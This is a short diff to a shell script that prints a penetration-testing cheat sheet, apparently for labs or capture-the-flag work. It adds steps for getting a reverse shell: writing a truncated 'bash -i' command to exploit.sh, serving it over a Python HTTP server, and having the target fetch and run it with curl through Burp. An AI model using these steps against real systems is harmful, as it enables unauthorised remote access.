@@ -39,3 +39,17 @@ echo "			<Transfer venom shell payload using preferred way>"
 echo "			(In msfconsole): exploit"
 echo "			(On target machine): ./<venom-shell-payload>"
 echo ""
+echo "	(5) Transfer and run revshell file if revshell command doesn't work"
+echo "		5.1) Put revshell command in a file, exploit.sh"
+echo "			bash -c \'bash -i ..."
+echo "		5.2) Serve the file on your computer in another window"
+echo "			python3 -m http.server 1337"
+echo "		5.3) Submit the payload with Burp"
+echo "			curl http://<my-ip>:1337/exploit.sh/bash"
+
+
+
+
+
+
+
